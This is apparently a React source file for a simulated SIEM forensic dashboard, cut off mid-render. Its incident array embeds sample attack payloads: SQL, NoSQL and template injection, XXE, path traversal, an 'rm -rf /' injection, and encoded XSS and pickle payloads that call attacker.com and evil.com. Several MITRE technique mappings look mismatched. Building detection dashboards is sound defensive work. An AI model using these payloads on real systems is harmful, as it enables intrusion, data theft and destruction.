import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Search, 
  Info, 
  Terminal, 
  FileJson, 
  Zap, 
  ShieldCheck, 
  History,
  AlertCircle,
  Network,
  ExternalLink as ExternalLinkIcon,
  ChevronRight,
  ChevronLeft,
  ShieldAlert,
  Download,
  ShieldX,
  Database,
  Layers
} from 'lucide-react';

// ==========================================
// REAL-WORLD FORENSIC DATABASE (22 SCENARIOS)
// ==========================================
const INCIDENT_DATABASE = [
  {
    id: "INV-2026-0842",
    score: 92,
    type: "NoSQL Injection Attempt",
    collection: "crm_users",
    timestamp: "2026-05-13 15:20:04",
    status: "Active",
    summary: "High-frequency query detected targeting authentication nodes. The payload contains recursive operator patterns designed to bypass value constraints.",
    rawLogData: {
      event_id: "kafka_0x4421",
      operation: "find",
      query: { username: { "$gt": "" }, password: { "$ne": null } },
      origin_ip: "104.22.18.204",
      threat_intel: { feed: "AlienVault_OTX", indicator_type: "IPv4", malicious_score: 88, context: "VPN Proxy Cluster / Tor Node Exit" },
      mitre_attack: { tactic: "TA0001 - Initial Access", technique: "T1190 - Exploit Public-Facing Application" }
    }
  },
  {
    id: "INV-2026-0843",
    score: 98,
    type: "Blind SQL Injection (Time-Based)",
    collection: "billing_ledgers",
    timestamp: "2026-05-13 15:44:12",
    status: "Active",
    summary: "Injected heavy procedural sleep windows observed on transaction lookup endpoints, suggesting schema exfiltration via timing channels.",
    rawLogData: {
      event_id: "pg_log_0x9921",
      operation: "SELECT",
      query: "SELECT * FROM ledgers WHERE id = '12' AND (SELECT 4821 FROM TEXT(PG_SLEEP(10)))--",
      origin_ip: "45.138.16.44",
      threat_intel: { feed: "CrowdStrike_Falcon", indicator_type: "IPv4", malicious_score: 96, context: "Known Bulletproof Hoster Segment" },
      mitre_attack: { tactic: "TA0007 - Discovery", technique: "T1046 - Network Service Discovery" }
    }
  },
  {
    id: "INV-2026-0844",
    score: 85,
    type: "Server-Side Request Forgery (SSRF)",
    collection: "media_attachments",
    timestamp: "2026-05-13 16:01:50",
    status: "Active",
    summary: "Profile avatar ingestion parser manipulated to fire internal loopback calls aiming for cloud metadata endpoints.",
    rawLogData: {
      event_id: "http_ingress_0x112",
      operation: "POST /v1/avatar/fetch",
      query: { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
      origin_ip: "185.220.101.5",
      threat_intel: { feed: "Spamhaus_DROP", indicator_type: "IPv4", malicious_score: 91, context: "Tor Exit Relay Node" },
      mitre_attack: { tactic: "TA0009 - Collection", technique: "T1560 - Archive Collected Data" }
    }
  },
  {
    id: "INV-2026-0845",
    score: 79,
    type: "Stored XSS Payload Mutation",
    collection: "user_comments",
    timestamp: "2026-05-13 16:15:33",
    status: "Active",
    summary: "Sanitization bypass utilizing breaking event handling attributes inside nested SVG vectors.",
    rawLogData: {
      event_id: "waf_alert_0x822",
      operation: "insert",
      query: { comment_body: "<svg/onload=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuY29tL2xvZycp'))>" },
      origin_ip: "194.26.135.12",
      threat_intel: { feed: "ThreatConnect", indicator_type: "IPv4", malicious_score: 74, context: "Residential Proxy Pool" },
      mitre_attack: { tactic: "TA0001 - Initial Access", technique: "T1189 - Drive-by Compromise" }
    }
  },
  {
    id: "INV-2026-0846",
    score: 94,
    type: "Path Traversal (LFI Attempt)",
    collection: "static_assets",
    timestamp: "2026-05-13 16:30:11",
    status: "Active",
    summary: "Null-byte termination string applied on localized file read operations to pull environment variables out of parent matrices.",
    rawLogData: {
      event_id: "fs_api_0x004",
      operation: "read_file",
      query: { filename: "../../../../../../../etc/passwd%00.png" },
      origin_ip: "91.240.118.89",
      threat_intel: { feed: "AbuseIPDB", indicator_type: "IPv4", malicious_score: 89, context: "Compromised SOHO Router" },
      mitre_attack: { tactic: "TA0007 - Discovery", technique: "T1083 - File and Directory Discovery" }
    }
  },
  {
    id: "INV-2026-0847",
    score: 87,
    type: "GraphQL Introspection Query Leak",
    collection: "api_gateway",
    timestamp: "2026-05-13 16:48:22",
    status: "Active",
    summary: "Full schema exploration payload submitted to public endpoint despite internal environment lockdown policies.",
    rawLogData: {
      event_id: "gql_router_0x77",
      operation: "POST /graphql",
      query: { query: "query { __schema { types { name fields { name } } } }" },
      origin_ip: "77.247.110.10",
      threat_intel: { feed: "AlienVault_OTX", indicator_type: "IPv4", malicious_score: 82, context: "Commercial Scanner (Census/Shodan)" },
      mitre_attack: { tactic: "TA0007 - Discovery", technique: "T1046 - Network Service Discovery" }
    }
  },
  {
    id: "INV-2026-0848",
    score: 96,
    type: "JWT Secret Key Brute-Force",
    collection: "auth_tokens",
    timestamp: "2026-05-13 17:02:00",
    status: "Active",
    summary: "Mass submission of access tokens signed with predictable/weak cryptographic key phrases, causing high signature fault counts.",
    rawLogData: {
      event_id: "auth_0x661",
      operation: "verify_token",
      query: { token_header: "alg:HS256", token_claims: { role: "admin", user: "root" } },
      origin_ip: "212.102.41.3",
      threat_intel: { feed: "Mandiant_Intel", indicator_type: "IPv4", malicious_score: 95, context: "Botnet node active in automated spraying" },
      mitre_attack: { tactic: "TA0006 - Credential Access", technique: "T1110 - Brute Force" }
    }
  },
  {
    id: "INV-2026-0849",
    score: 68,
    type: "IDOR Data Harvesting",
    collection: "invoice_records",
    timestamp: "2026-05-13 17:15:10",
    status: "Active",
    summary: "Sequential iteration of parameters outside the session structure, resulting in access across accounts without matching ACL authorizations.",
    rawLogData: {
      event_id: "api_endpoint_0x8",
      operation: "GET /api/invoices/INV-100024",
      query: { active_session: "usr_99182", targeting_resource_owner: "usr_00219" },
      origin_ip: "198.51.100.42",
      threat_intel: { feed: "Internal_Anom", indicator_type: "IPv4", malicious_score: 60, context: "Uncategorized Cloud Provider Lease" },
      mitre_attack: { tactic: "TA0009 - Collection", technique: "T1114 - Email Collection" }
    }
  },
  {
    id: "INV-2026-0850",
    score: 89,
    type: "Command Injection via Metadata Exchange",
    collection: "image_transcoder",
    timestamp: "2026-05-13 17:40:44",
    status: "Active",
    summary: "Shell meta-characters integrated within EXIF comment string arrays executed during post-upload asset pipeline conversion.",
    rawLogData: {
      event_id: "worker_0x33b",
      operation: "exec_transform",
      query: { file_comment: "ImageMagick; rm -rf /; #", execution_string: "convert source.jpg target.png" },
      origin_ip: "141.98.11.54",
      threat_intel: { feed: "CrowdStrike_Falcon", indicator_type: "IPv4", malicious_score: 92, context: "Targeted Infrastructure Broad Scanner" },
      mitre_attack: { tactic: "TA0002 - Execution", technique: "T1059 - Command and Scripting Interpreter" }
    }
  },
  {
    id: "INV-2026-0851",
    score: 74,
    type: "Mass Assignment Mass Mutation",
    collection: "user_profiles",
    timestamp: "2026-05-13 17:59:01",
    status: "Active",
    summary: "Injecting specialized configuration control parameters into registration models, aiming to rewrite permissions matrices.",
    rawLogData: {
      event_id: "express_router_0x12",
      operation: "PUT /v1/user/settings",
      query: { is_admin: true, billing_plan: "enterprise_free", email: "attacker@evil.corp" },
      origin_ip: "103.253.42.11",
      threat_intel: { feed: "AbuseIPDB", indicator_type: "IPv4", malicious_score: 70, context: "Commercial VPN Node" },
      mitre_attack: { tactic: "TA0003 - Persistence", technique: "T1098 - Account Manipulation" }
    }
  },
  {
    id: "INV-2026-0852",
    score: 99,
    type: "Log4Shell/RCE Verification String",
    collection: "syslog_ingest",
    timestamp: "2026-05-13 18:11:15",
    status: "Active",
    summary: "JNDI directory call injection detected within header field structures, attempting remote resource payload evaluation.",
    rawLogData: {
      event_id: "edge_proxy_0x009",
      operation: "GET /index.php",
      query: { user_agent: "${jndi:ldap://log-collector.attacker.com/a}" },
      origin_ip: "185.156.74.52",
      threat_intel: { feed: "Feodo_Tracker", indicator_type: "IPv4", malicious_score: 100, context: "Known Active C2 Server Infrastructure" },
      mitre_attack: { tactic: "TA0002 - Execution", technique: "T1210 - Exploitation of Remote Services" }
    }
  },
  {
    id: "INV-2026-0853",
    score: 83,
    type: "NoSQL JavaScript Injection Regex Target",
    collection: "product_catalog",
    timestamp: "2026-05-13 18:24:50",
    status: "Active",
    summary: "Arbitrary MongoDB server-side code execution attempt passing evaluate execution hooks to access underlying system maps.",
    rawLogData: {
      event_id: "mongo_cluster_0x33",
      operation: "$where",
      query: { "$where": "function() { return this.secret_key === 'match' || sleep(5000); }" },
      origin_ip: "80.92.32.14",
      threat_intel: { feed: "AlienVault_OTX", indicator_type: "IPv4", malicious_score: 81, context: "Hosting Provider Data Center Cluster" },
      mitre_attack: { tactic: "TA0001 - Initial Access", technique: "T1190 - Exploit Public-Facing Application" }
    }
  },
  {
    id: "INV-2026-0854",
    score: 91,
    type: "XML External Entity Execution (XXE)",
    collection: "b2b_invoices",
    timestamp: "2026-05-13 18:40:02",
    status: "Active",
    summary: "System doctype mapping modifications within incoming supply chain data schemas, intending file-system linkage extraction.",
    rawLogData: {
      event_id: "soap_endpoint_0x99",
      operation: "POST /xml/receiver",
      query: { body: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/issue'>]><invoice>&xxe;</invoice>" },
      origin_ip: "193.106.191.22",
      threat_intel: { feed: "EmergingThreats", indicator_type: "IPv4", malicious_score: 94, context: "Hostile Scanning Script Origin" },
      mitre_attack: { tactic: "TA0009 - Collection", technique: "T1005 - Data from Local System" }
    }
  },
  {
    id: "INV-2026-0855",
    score: 72,
    type: "Race Condition Ledger Tampering",
    collection: "wallet_balances",
    timestamp: "2026-05-13 18:55:19",
    status: "Active",
    summary: "Concurrently dispatched transaction verification calls designed to settle ledger items during asynchronous operation gaps.",
    rawLogData: {
      event_id: "redis_pubsub_0x12",
      operation: "DECREMENT /v1/withdraw",
      query: { requests_dispatched: 40, interval_ms: 2, amount_per_req: 100 },
      origin_ip: "46.229.168.65",
      threat_intel: { feed: "Internal_Heuristics", indicator_type: "IPv4", malicious_score: 68, context: "Distributed Mobile IP Matrix" },
      mitre_attack: { tactic: "TA0005 - Defense Evasion", technique: "T1572 - Protocol Tunneling" }
    }
  },
  {
    id: "INV-2026-0856",
    score: 88,
    type: "Deserialization Gadget Chain Attack",
    collection: "session_cache",
    timestamp: "2026-05-13 19:10:44",
    status: "Active",
    summary: "Serialized object graphs passed inside base64 session parameters to trigger automatic memory variable expansions.",
    rawLogData: {
      event_id: "jvm_core_0x552",
      operation: "unmarshal",
      query: { base64_payload: "rO0ABXNyADNjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBs..." },
      origin_ip: "5.188.84.21",
      threat_intel: { feed: "ThreatConnect", indicator_type: "IPv4", malicious_score: 93, context: "Known Scanning Infrastructure Vector" },
      mitre_attack: { tactic: "TA0002 - Execution", technique: "T1203 - Exploitation for Client Execution" }
    }
  },
  {
    id: "INV-2026-0857",
    score: 95,
    type: "CORS Misconfiguration Abuse",
    collection: "internal_analytics",
    timestamp: "2026-05-13 19:22:10",
    status: "Active",
    summary: "Cross-Origin checks manipulated via empty headers, forcing system feedback reflecting internal telemetry channels out to arbitrary external vectors.",
    rawLogData: {
      event_id: "nginx_access_0x001",
      operation: "OPTIONS /telemetry",
      query: { "Origin": "http://evil-tracker-domain.xyz", "Access-Control-Allow-Credentials": "true" },
      origin_ip: "178.62.203.45",
      threat_intel: { feed: "Spamhaus_DROP", indicator_type: "IPv4", malicious_score: 87, context: "Malicious Hosting Segment Node" },
      mitre_attack: { tactic: "TA0009 - Collection", technique: "T1020 - Automated Exfiltration" }
    }
  },
  {
    id: "INV-2026-0858",
    score: 81,
    type: "Open Redirect Verification Loop",
    collection: "sso_router",
    timestamp: "2026-05-13 19:35:12",
    status: "Active",
    summary: "Link validation configuration bypassed using url character obfuscations, aiming to leverage trusted login redirects for phishing vectors.",
    rawLogData: {
      event_id: "oauth_proxy_0x82",
      operation: "GET /login/callback",
      query: { next: "https://trusted-site.com@attacker-controlled-phish.net/payload" },
      origin_ip: "185.230.125.10",
      threat_intel: { feed: "AbuseIPDB", indicator_type: "IPv4", malicious_score: 77, context: "Residential Dynamic ISP Block" },
      mitre_attack: { tactic: "TA0001 - Initial Access", technique: "T1566 - Phishing" }
    }
  },
  {
    id: "INV-2026-0859",
    score: 97,
    type: "Prototype Pollution Input Mutation",
    collection: "fleet_telemetry",
    timestamp: "2026-05-13 19:50:00",
    status: "Active",
    summary: "Unsanitized recursive deep merge execution routes targeted to overwrite global system default parameter behaviors.",
    rawLogData: {
      event_id: "node_runtime_0x91",
      operation: "POST /api/config",
      query: { "__proto__.toString": "污染", "__proto__.isAdmin": true },
      origin_ip: "109.235.241.12",
      threat_intel: { feed: "Mandiant_Intel", indicator_type: "IPv4", malicious_score: 96, context: "Targeted Infrastructure Command Station" },
      mitre_attack: { tactic: "TA0005 - Defense Evasion", technique: "T1562 - Impair Defenses" }
    }
  },
  {
    id: "INV-2026-0860",
    score: 90,
    type: "SSTI (Server Side Template Injection)",
    collection: "notification_templates",
    timestamp: "2026-05-13 20:05:44",
    status: "Active",
    summary: "Template injection payload submitted via custom styling variables, aiming for runtime shell orchestration.",
    rawLogData: {
      event_id: "jinja2_engine_0x4",
      operation: "render_string",
      query: { custom_format: "{{self.__init__.__globals__.__specs__['os'].popen('id').read()}}" },
      origin_ip: "195.123.211.8",
      threat_intel: { feed: "CrowdStrike_Falcon", indicator_type: "IPv4", malicious_score: 91, context: "High Anomaly Dedicated VPS Route" },
      mitre_attack: { tactic: "TA0002 - Execution", technique: "T1059 - Command and Scripting Interpreter" }
    }
  },
  {
    id: "INV-2026-0861",
    score: 76,
    type: "LDAP Filter Logic Bypass",
    collection: "active_directory_mirror",
    timestamp: "2026-05-13 20:18:22",
    status: "Active",
    summary: "Wildcard filter inclusions within identity searches aimed at mapping directory nodes without valid account records.",
    rawLogData: {
      event_id: "ldap_conn_0x921",
      operation: "searchExt",
      query: { base: "dc=corp,dc=local", filter: "(&(objectClass=user)(samAccountName=*))" },
      origin_ip: "93.174.93.14",
      threat_intel: { feed: "AlienVault_OTX", indicator_type: "IPv4", malicious_score: 84, context: "Known Scanning Infrastructure Vector" },
      mitre_attack: { tactic: "TA0007 - Discovery", technique: "T1087 - Account Discovery" }
    }
  },
  {
    id: "INV-2026-0862",
    score: 93,
    type: "API Rate Limit Exhaustion Flooding",
    collection: "sms_otp_gateway",
    timestamp: "2026-05-13 20:31:05",
    status: "Active",
    summary: "Distributed high-volume request streams using variable proxy targets to stress downstream processing gateways.",
    rawLogData: {
      event_id: "rate_limiter_0x11",
      operation: "POST /v2/auth/sms",
      query: { concurrent_connections: 8500, user_agents_total: 410, action: "FORCED_BURST" },
      origin_ip: "185.220.101.24",
      threat_intel: { feed: "ThreatConnect", indicator_type: "IPv4", malicious_score: 89, context: "Tor Exit Relay Node" },
      mitre_attack: { tactic: "TA0004 - Privilege Escalation", technique: "T1548 - Abuse Elevation Control Mechanism" }
    }
  },
  {
    id: "INV-2026-0863",
    score: 86,
    type: "Insecure Deserialization (Python Pickle)",
    collection: "job_queue_store",
    timestamp: "2026-05-13 20:45:19",
    status: "Active",
    summary: "Python execution bypass utilizing reduce object reconstruction hooks within asynchronous worker distribution configurations.",
    rawLogData: {
      event_id: "celery_worker_0x02",
      operation: "load_pickle",
      query: { payload_bytes: "Y29zCnN5c3RlbQpjcG9zaXgKc3lzdGVtCnAxCihTMid3Z2V0IGh0dHA6Ly9ldmlsLmNvbS9zaGVsbCcKUnAyCi4=" },
      origin_ip: "104.244.73.20",
      threat_intel: { feed: "AbuseIPDB", indicator_type: "IPv4", malicious_score: 83, context: "Data Center Hosting Router Segment" },
      mitre_attack: { tactic: "TA0002 - Execution", technique: "T1204 - User Execution" }
    }
  }
];

const Investigations = () => {
  const [activeTab, setActiveTab] = useState('raw');
  const [currentIndex, setCurrentIndex] = useState(0);

  // Retrieve current active record context from the simulated dataset array
  const activeIncidentMock = INCIDENT_DATABASE[currentIndex];

  // PERSISTENT STATE FOR FIREWALL STATUS: Tracks state per specific case ID using localized keys
  const [isIpBlocked, setIsIpBlocked] = useState(() => {
    try {
      const saved = localStorage.getItem(`${activeIncidentMock.id}-ipBlocked`);
      return saved ? JSON.parse(saved) : false;
    } catch (e) { return false; }
  });

  // PERSISTENT STATE FOR RESOLUTION STATUS
  const [incidentStatus, setIncidentStatus] = useState(() => {
    try {
      const saved = localStorage.getItem(`${activeIncidentMock.id}-status`);
      return saved ? saved : activeIncidentMock.status;
    } catch (e) { return activeIncidentMock.status; }
  });

  // Sync component states dynamically whenever a user clicks through to another scenario record
  React.useEffect(() => {
    const savedIp = localStorage.getItem(`${activeIncidentMock.id}-ipBlocked`);
    setIsIpBlocked(savedIp ? JSON.parse(savedIp) : false);

    const savedStatus = localStorage.getItem(`${activeIncidentMock.id}-status`);
    setIncidentStatus(savedStatus ? savedStatus : activeIncidentMock.status);
  }, [currentIndex, activeIncidentMock.id, activeIncidentMock.status]);

  // Comprehensive dynamic log visualization structure construction
  const rawLogData = {
    event_id: activeIncidentMock.rawLogData.event_id,
    collection: activeIncidentMock.collection,
    operation: activeIncidentMock.rawLogData.operation,
    query: activeIncidentMock.rawLogData.query,
    origin_ip: activeIncidentMock.rawLogData.origin_ip,
    timestamp: activeIncidentMock.timestamp,
    threat_intel: activeIncidentMock.rawLogData.threat_intel,
    mitre_attack: activeIncidentMock.rawLogData.mitre_attack,
    mitigation_status: isIpBlocked ? "Blocked at Perimeter Firewall" : "Monitoring",
    reremediation_applied: incidentStatus === "Resolved" ? "Type-Casting / Schema Validation Rule Enforced" : "None"
  };

  const handleExportEvidence = () => {
    try {
      const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(rawLogData, null, 2));
      const downloadAnchor = document.createElement('a');
      downloadAnchor.setAttribute("href", dataStr);
      downloadAnchor.setAttribute("download", `evidence-${activeIncidentMock.id}.json`);
      document.body.appendChild(downloadAnchor);
      downloadAnchor.click();
      downloadAnchor.remove();
    } catch (error) {
      console.error("Failed to export forensic evidence:", error);
    }
  };

  const handleMarkAsResolved = () => {
    const nextStatus = incidentStatus === "Resolved" ? "Active" : "Resolved";
    setIncidentStatus(nextStatus);
    localStorage.setItem(`${activeIncidentMock.id}-status`, nextStatus);
  };

  const handleExecuteIpBlock = () => {
    const nextIpState = !isIpBlocked;
    setIsIpBlocked(nextIpState);
    localStorage.setItem(`${activeIncidentMock.id}-ipBlocked`, JSON.stringify(nextIpState));
  };

  const handleNextIncident = () => {
    if (currentIndex < INCIDENT_DATABASE.length - 1) {
      setCurrentIndex(currentIndex + 1);
    }
  };

  const handlePrevIncident = () => {
    if (currentIndex > 0) {
      setCurrentIndex(currentIndex - 1);
    }
  };

  return (
    <div className="p-4 md:p-8 space-y-8 max-w-[1600px] mx-auto text-slate-100 bg-slate-950 min-h-screen selection:bg-indigo-500/30 selection:text-white">
      
      {/* Header Container */}
      <header className="flex flex-col md:flex-row md:items-center justify-between gap-6 border-b border-slate-900 pb-6">
        <div>
          <div className="flex items-center gap-2 text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2">
            <span className="hover:text-indigo-400 cursor-pointer transition-colors">SIEM Anomalies</span>
            <ChevronRight size={10} />
            <span className="text-indigo-400">{activeIncidentMock.id}</span>
            <ChevronRight size={10} />
            <span className="text-slate-400">Record {currentIndex + 1} of {INCIDENT_DATABASE.length}</span>
            <span className={`px-2 py-0.5 rounded ml-2 text-[9px] font-mono tracking-normal ${incidentStatus === 'Resolved' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : 'bg-rose-500/10 text-rose-400 border border-rose-500/20'}`}>
              {incidentStatus}
            </span>
          </div>
          <h1 className="text-3xl font-black text-white tracking-tight flex items-center gap-3">
            <Layers className="text-indigo-500" size={28} /> Forensic Investigation Pipeline
          </h1>
        </div>
        
        {/* Navigation & Action Controls */}
        <div className="flex flex-wrap items-center gap-3">
          <div className="flex items-center bg-slate-900 border border-slate-800 rounded-xl p-1 mr-2">
            <button 
              onClick={handlePrevIncident} 
              disabled={currentIndex === 0}
              className="p-2 text-slate-400 hover:text-white disabled:opacity-30 disabled:pointer-events-none transition-colors"
              title="Previous Incident"
            >
              <ChevronLeft size={16} />
            </button>
            <div className="text-xs font-mono px-2 text-slate-400 min-w-[60px] text-center select-none">
              {currentIndex + 1} / {INCIDENT_DATABASE.length}
            </div>
            <button 
              onClick={handleNextIncident} 
              disabled={currentIndex === INCIDENT_DATABASE.length - 1}
              className="p-2 text-slate-400 hover:text-white disabled:opacity-30 disabled:pointer-events-none transition-colors"
              title="Next Incident"
            >
              <ChevronRight size={16} />
            </button>
          </div>

          <button 
            onClick={handleExportEvidence}
            className="flex items-center gap-2 px-4 py-2 bg-slate-900 border border-slate-800 text-slate-300 rounded-xl text-xs font-bold hover:bg-slate-800 transition-all cursor-pointer"
          >
            <Download size={14} /> Export Forensic Bundle
          </button>
          <button 
            onClick={handleMarkAsResolved}
            className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all shadow-lg cursor-pointer ${
              incidentStatus === 'Resolved' 
                ? 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/20' 
                : 'bg-indigo-600 hover:bg-indigo-500 text-white shadow-indigo-600/20'
            }`}
          >
            <ShieldAlert size={14} /> 
            {incidentStatus === 'Resolved' ? 'Reopen Case Record' : 'Mark Case Resolved'}
          </button>
        </div>
      </header>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
        {/* Left Forensic Data Display Column */}
        <div className="lg:col-span-8 space-y-6">
          <motion.div 
            key={`card-${activeIncidentMock.id}`}
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            className={`p-6 rounded-2xl bg-slate-900/40 border border-slate-800 border-l-4 backdrop-blur-xl transition-all ${
              incidentStatus === 'Resolved' ? 'border-l-emerald-500' : 'border-l-rose-500'
            }`}
          >
            <div className="flex items-start justify-between mb-6">
              <div className="flex items-center gap-4">
                <div className={`p-3 rounded-xl border ${incidentStatus === 'Resolved' ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-rose-500/10 border-rose-500/20'}`}>
                  <AlertCircle className={incidentStatus === 'Resolved' ? 'text-emerald-500' : 'text-rose-500'} size={24} />
                </div>
                <div>
                  <h2 className="text-xl font-bold text-white tracking-tight">{activeIncidentMock.type}</h2>
                  <p className="text-xs text-slate-500 font-mono">Telemetry Identification Index Model v2.4</p>
                </div>
              </div>
              <span className={`px-3 py-1 bg-slate-950 border border-slate-800 rounded-full text-xs font-black ${incidentStatus === 'Resolved' ? 'text-emerald-500' : 'text-rose-500'}`}>
                CVSS {activeIncidentMock.score}/100
              </span>
            </div>

            <p className="text-sm text-slate-300 leading-relaxed font-normal">
              {activeIncidentMock.summary} Attack vectors trace directly down to the target data collective cluster: <code className="text-indigo-400 font-mono bg-indigo-950/40 px-1.5 py-0.5 rounded border border-indigo-900/40">{activeIncidentMock.collection}</code>.
            </p>
          </motion.div>

          {/* Interactive Core Analytical Tabs */}
          <div className="rounded-2xl bg-slate-900/40 border border-slate-800 overflow-hidden">
            <div className="flex bg-slate-950/50 border-b border-slate-800">
              {['raw', 'timeline', 'network'].map((tab) => (
                <button
                  key={tab}
                  onClick={() => setActiveTab(tab)}
                  className={`px-6 py-4 text-[10px] font-black uppercase tracking-widest transition-all cursor-pointer ${
                    activeTab === tab ? 'text-indigo-400 border-b-2 border-indigo-500 bg-slate-900/50' : 'text-slate-500 hover:text-slate-300'
                  }`}
                >
                  {tab} Payload Maps
                </button>
              ))}
            </div>

            <div className="p-6 min-h-[380px]">
              <AnimatePresence mode="wait">
                {activeTab === 'raw' && (
                  <motion.div 
                    key={`raw-${activeIncidentMock.id}`}
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                  >
                    <pre className="font-mono text-xs text-indigo-300/90 leading-relaxed overflow-x-auto bg-slate-950/80 p-5 rounded-xl border border-slate-800/50 max-h-[500px]">
                      {JSON.stringify(rawLogData, null, 2)}
                    </pre>
                  </motion.div>
                )}
                
                {activeTab === 'timeline' && (
                  <motion.div 
                    key={`timeline-${activeIncidentMock.id}`}
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    className="space-y-5 font-mono text-xs"
                  >
                    {incidentStatus === 'Resolved' && (
                      <div className="flex gap-4 border-l-2 border-emerald-400 pl-4 relative">
                        <div className="w-2 h-2 rounded-full bg-emerald-400 absolute -left-[5px] top-1" />
                        <span className="text-slate-500 font-semibold min-w-[130px]">System Patch</span>
                        <span className="text-emerald-400">Resolution Applied: Mitigated vulnerability matrix configuration permanently.</span>
                      </div>
                    )}
                    {isIpBlocked && (
                      <div className="flex gap-4 border-l-2 border-emerald-500 pl-4 relative">
                        <div className="w-2 h-2 rounded-full bg-emerald-500 absolute -left-[5px] top-1" />
                        <span className="text-slate-500 font-semibold min-w-[130px]">Just Now</span>
                        <span className="text-emerald-400">Syscall Drop: Enacted parameter drop protocol for proxy address {activeIncidentMock.rawLogData.origin_ip}</span>
                      </div>
                    )}
                    <div className="flex gap-4 border-l-2 border-rose-500 pl-4 relative">
                      <div className="w-2 h-2 rounded-full bg-rose-500 absolute -left-[5px] top-1" />
                      <span className="text-slate-500 min-w-[130px]">{activeIncidentMock.timestamp}</span>
                      <span className="text-rose-400">Anomalous Target Execution Event Captured</span>
                    </div>
                    <div className="flex gap-4 border-l-2 border-slate-800 pl-4 relative">
                      <div className="w-2 h-2 rounded-full bg-amber-500 absolute -left-[5px] top-1" />
                      <span className="text-slate-500 min-w-[130px]">Pre-Incident</span>
                      <span className="text-amber-400">Connection frequency spikes from tracking segment address {activeIncidentMock.rawLogData.origin_ip}</span>
                    </div>
                  </motion.div>
                )}
                
                {activeTab === 'network' && (
                  <motion.div 
                    key={`network-${activeIncidentMock.id}`}
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    className="space-y-3"
                  >
                    <div className="p-5 bg-slate-950/50 rounded-xl border border-slate-800 text-xs font-mono grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <span className="text-slate-500 block mb-1">MITRE ATT&CK Tactic:</span>
                        <span className="text-indigo-300 font-bold">{activeIncidentMock.rawLogData.mitre_attack.tactic}</span>
                      </div>
                      <div>
                        <span className="text-slate-500 block mb-1">MITRE ATT&CK Technique:</span>
                        <span className="text-indigo-300 font-bold">{activeIncidentMock.rawLogData.mitre_attack.technique}</span>
                      </div>
                      <div>
                        <span className="text-slate-500 block mb-1">Intel Threat Stream Source:</span>
                        <span className="text-cyan-400 font-bold">{activeIncidentMock.rawLogData.threat_intel.feed}</span>
                      </div>
                      <div>
                        <span className="text-slate-500 block mb-1">Edge Firewall Mitigation Vector:</span>
                        <span className={isIpBlocked ? "text-emerald-400 font-bold animate-pulse" : "text-rose-400 font-bold"}>
                          {isIpBlocked ? "DROP POLICY (Active Active)" : "ACCEPT RULES (No Restrictions)"}
                        </span>
                      </div>
                      <div className="md:col-span-2 border-t border-slate-900 pt-3 mt-1">
                        <span className="text-slate-500 block mb-1">Pipeline Protection Architecture State:</span>
                        <span className={incidentStatus === 'Resolved' ? "text-emerald-400 font-bold" : "text-amber-400 font-bold"}>
                          {incidentStatus === 'Resolved' ? "SANITISED / BOUNDED PATTERNS (Protected)" : "DYNAMIC EXECUTION INTERPRETER (Vulnerable Node)"}
                        </span>
                      </div>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          </div>
        </div>

        {/* Right Sidebar - Dynamic AI Analysis & Meta Context */}
        <aside className="lg:col-span-4 space-y-6">
          <motion.div 
            whileHover={{ y: -3 }} 
            className="p-6 rounded-2xl bg-gradient-to-br from-indigo-950/20 to-slate-900/60 border border-indigo-500/10 shadow-2xl"
          >
            <div className="flex items-center gap-2 mb-4 text-indigo-400">
              <Zap size={18} className="fill-indigo-400/30" />
              <h3 className="text-sm font-black uppercase tracking-widest">AI Agent Incident Analysis</h3>
            </div>
            
            <div className="space-y-4">
              <div className="p-4 bg-slate-950/90 rounded-xl border border-slate-800">
                {incidentStatus === 'Resolved' ? (
                  <p className="text-[11px] text-emerald-400 leading-relaxed italic font-mono">
                    "Incident configuration state set to RESOLVED. System configuration rules updated via structured constraint checks, shielding target data mapping collections against vector parameter variations."
                  </p>
                ) : isIpBlocked ? (
                  <p className="text-[11px] text-emerald-400 leading-relaxed italic font-mono">
                    "Perimeter rule deployment successful. Origin route resource {activeIncidentMock.rawLogData.origin_ip} dropped at cloud perimeter. Internal system execution pathways remain exposed until application validation schemas are patched."
                  </p>
                ) : (
                  <p className="text-[11px] text-slate-300 leading-relaxed italic font-mono">
                    "Identified payload execution footprint matches high-severity {activeIncidentMock.type} signatures. Recommendation: Enforce explicit structural constraints, type casting filters, or perimeter network containment."
                  </p>
                )}
              </div>
              
              <button 
                onClick={handleExecuteIpBlock}
                className={`w-full py-3 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all cursor-pointer flex items-center justify-center gap-2 ${
                  isIpBlocked 
                    ? 'bg-rose-950/40 border border-rose-500/30 text-rose-400 hover:bg-rose-900/30 shadow-lg shadow-rose-950/20' 
                    : 'bg-indigo-600 hover:bg-indigo-500 text-white shadow-lg shadow-indigo-600/20'
                }`}
              >
                {isIpBlocked ? (
                  <>
                    <ShieldX size={12} /> Clear Firewall Perimeter Rule
                  </>
                ) : (
                  "Deploy Perimeter Network Block"
                )}
              </button>
            </div>
          </motion.div>

          <div className="p-6 rounded-2xl bg-slate-900/40 border border-slate-800">
            <h3 className="text-xs font-bold text-white uppercase tracking-widest mb-4 flex items-center gap-2">
              <Network size={14} className="text-cyan-400" /> Intelligence Context Matrix
            </h3>
            <div className="space-y-3">
              {[
